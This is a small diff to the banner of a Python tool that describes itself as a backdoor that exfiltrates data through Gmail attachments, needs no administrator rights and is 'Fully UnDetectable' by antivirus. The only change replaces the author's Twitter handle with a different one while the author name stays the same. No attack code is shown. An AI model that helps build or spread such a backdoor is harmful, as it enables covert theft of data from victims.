@@ -24,7 +24,7 @@ def logo():
           ..."        ------~""
                                                                           
 [+] Author: Viral Maniar
-[+] Twitter: @ManiarViral
+[+] Twitter: @Alex_14324
 [+] Description: Python based backdoor that uses Gmail to exfiltrate data as an attachment.
 [+] Note: This backdoor does not require administrator privileges. This piece of code is Fully UnDetectable (FUD) by Anti-Virus (AV) software.
 [+] Python version: 3.6.3
